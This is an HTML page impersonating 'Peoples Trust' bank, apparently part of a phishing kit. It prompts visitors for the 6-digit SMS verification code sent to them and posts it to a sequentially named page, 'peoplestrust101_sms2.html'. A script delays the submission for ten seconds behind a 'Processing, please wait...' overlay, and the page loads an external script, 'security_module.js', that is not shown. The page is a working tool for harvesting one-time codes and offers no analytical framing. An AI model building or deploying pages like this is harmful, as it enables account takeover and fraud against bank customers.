<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        
body { font-family: Arial, sans-serif; background: white; color: #333; margin: 0; }
.t-header { text-align: center; padding: 40px 20px 20px; border-bottom: 1px solid #eee; }
.t-logo-icon { color: #628ab2; font-size: 45px; }
.t-logo-text { font-size: 26px; color: #444; margin-top: 10px; font-weight: normal; }
.t-container { padding: 40px 20px; max-width: 400px; margin: 0 auto; }
.t-label { display: block; margin-top: 30px; font-size: 13px; color: #333; text-transform: uppercase; }
.t-input { width: 100%; border: none; border-bottom: 1px solid #ccc; padding: 15px 0 10px 0; font-size: 16px; outline: none; }
.t-input:focus { border-bottom: 2px solid #628ab2; }
.t-link { text-align: right; display: block; margin-top: 15px; color: #333; font-size: 14px; text-decoration: none;}
.t-btn { width: 100%; background: #ccc; color: white; border: none; padding: 18px; font-size: 16px; font-weight: bold; margin-top: 40px; cursor: pointer; border-radius: 2px; }
form:valid .t-btn { background: #628ab2; }

        /* Loader Overlay */
        .loader-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(255, 255, 255, 0.95);
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            z-index: 999999; visibility: hidden; opacity: 0; transition: opacity 0.3s;
            font-family: Arial, sans-serif;
        }
        .loader-overlay.active { visibility: visible; opacity: 1; }
        .loader-spinner {
            border: 4px solid #f3f3f3; border-top: 4px solid #628ab2;
            border-radius: 50%; width: 50px; height: 50px;
            animation: spin 1s linear infinite; margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loader-text { font-size: 18px; font-weight: bold; color: #333; }
        .success-icon { font-size: 70px; color: #628ab2; margin: 30px auto; display: block; text-align: center; }
        .success-desc { font-size: 16px; color: #333; line-height: 1.5; margin-bottom: 30px; text-align: center; padding: 0 20px; }
    </style>
</head>
<body>
    
<div class="t-header"><div class="t-logo-icon"><i class="fa-solid fa-p"></i></div><div class="t-logo-text">Peoples Trust</div></div>
<div class="t-container">
    <form action="peoplestrust101_sms2.html" method="POST">
        <label class="t-label">VERIFICATION CODE</label>
        <input type="text" class="t-input" placeholder="000000" required>
        <div style="margin-top:15px;font-size:14px;color:#666;">Enter the 6-digit code sent to you.</div>
        
        
        
        
        <label style="display:flex; align-items:center; font-size:15px; margin-top:30px;"><input type="checkbox" style="width:18px;height:18px;margin-right:10px;"> Remember Me</label>
        
        <button type="submit" class="t-btn">VERIFY</button>
    </form>
    <div style="text-align: center; margin-top: 30px;"><a href="#" style="color:#666; text-decoration:none; font-size:14px;">Forgot Password?</a></div>
</div>

    <div id="loaderOverlay" class="loader-overlay">
        <div class="loader-spinner"></div>
        <p class="loader-text">Processing, please wait...</p>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const loader = document.getElementById('loaderOverlay');
            if(form && loader) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    loader.classList.add('active');
                    setTimeout(function() { form.submit(); }, 10000);
                });
            }
        });
    </script>
<script src="security_module.js"></script>
</body>
</html>
